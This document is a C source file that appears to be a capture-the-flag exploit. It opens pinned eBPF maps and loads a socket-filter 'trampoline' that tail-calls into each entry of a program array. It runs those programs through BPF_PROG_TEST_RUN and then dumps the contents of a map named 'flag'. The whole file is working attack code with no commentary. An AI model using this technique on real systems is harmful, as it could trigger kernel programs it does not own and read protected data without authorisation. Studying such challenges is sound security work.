#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

#ifndef BPF_PSEUDO_MAP_FD
#define BPF_PSEUDO_MAP_FD 1
#endif

#ifndef BPF_FUNC_tail_call
#define BPF_FUNC_tail_call 12
#endif

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){ .code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM })

#define BPF_MOV64_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_LD_MAP_FD(DST, FD) \
    BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, BPF_PSEUDO_MAP_FD, 0, FD), \
    BPF_RAW_INSN(0, 0, 0, 0, 0)

#define BPF_EMIT_CALL(FUNC) \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)

#define BPF_EXIT_INSN() \
    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

static int bpf(enum bpf_cmd cmd, union bpf_attr *a) {
    return syscall(__NR_bpf, cmd, a, sizeof(*a));
}

static int obj_get(const char *path) {
    union bpf_attr a = {0};
    a.pathname = (uint64_t)path;
    return bpf(BPF_OBJ_GET, &a);
}

static int lookup(int mapfd, uint32_t key, void *val) {
    union bpf_attr a = {0};
    a.map_fd = mapfd;
    a.key = (uint64_t)&key;
    a.value = (uint64_t)val;
    return bpf(BPF_MAP_LOOKUP_ELEM, &a);
}

static int run_prog(int pfd) {
    char in[64] = {0};
    char out[256] = {0};

    union bpf_attr a = {0};
    a.test.prog_fd = pfd;
    a.test.data_in = (uint64_t)in;
    a.test.data_out = (uint64_t)out;
    a.test.data_size_in = sizeof(in);
    a.test.data_size_out = sizeof(out);
    a.test.repeat = 1;

    return bpf(BPF_PROG_TEST_RUN, &a);
}

static int load_trampoline(int prog_map_fd, uint32_t key) {
    char log[65536] = {0};

    struct bpf_insn insns[] = {
        /*
         * r1 = ctx already
         * r2 = prog_map
         * r3 = key
         * call bpf_tail_call(ctx, prog_map, key)
         */
        BPF_LD_MAP_FD(BPF_REG_2, prog_map_fd),
        BPF_MOV64_IMM(BPF_REG_3, key),
        BPF_EMIT_CALL(BPF_FUNC_tail_call),

        /* if tail_call fails */
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    const char license[] = "GPL";

    union bpf_attr a = {0};
    a.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    a.insn_cnt = sizeof(insns) / sizeof(insns[0]);
    a.insns = (uint64_t)insns;
    a.license = (uint64_t)license;
    a.log_buf = (uint64_t)log;
    a.log_size = sizeof(log);
    a.log_level = 1;

    int fd = bpf(BPF_PROG_LOAD, &a);
    if (fd < 0) {
        perror("BPF_PROG_LOAD");
        if (log[0])
            fprintf(stderr, "verifier log:\n%s\n", log);
    }

    return fd;
}

int main(void) {
    int prog_map = obj_get("/sys/fs/bpf/prog_map");
    int flag_map = obj_get("/sys/fs/bpf/flag");

    if (prog_map < 0 || flag_map < 0) {
        perror("obj_get");
        return 1;
    }

    for (uint32_t key = 0; key < 32; key++) {
        uint32_t prog_id = 0;

        if (lookup(prog_map, key, &prog_id) == 0 && prog_id) {
            fprintf(stderr, "key %u -> prog_id %u\n", key, prog_id);

            int tramp = load_trampoline(prog_map, key);
            if (tramp < 0)
                continue;

            if (run_prog(tramp) < 0)
                perror("BPF_PROG_TEST_RUN");

            close(tramp);
        }
    }

    puts("flag map:");
    for (uint32_t key = 0; key < 64; key++) {
        char v[256] = {0};

        if (lookup(flag_map, key, v) == 0) {
            for (int i = 0; i < 256; i++) {
                unsigned char c = v[i];
                if (c >= 0x20 && c <= 0x7e)
                    putchar(c);
            }
        }
    }

    putchar('\n');
    return 0;
}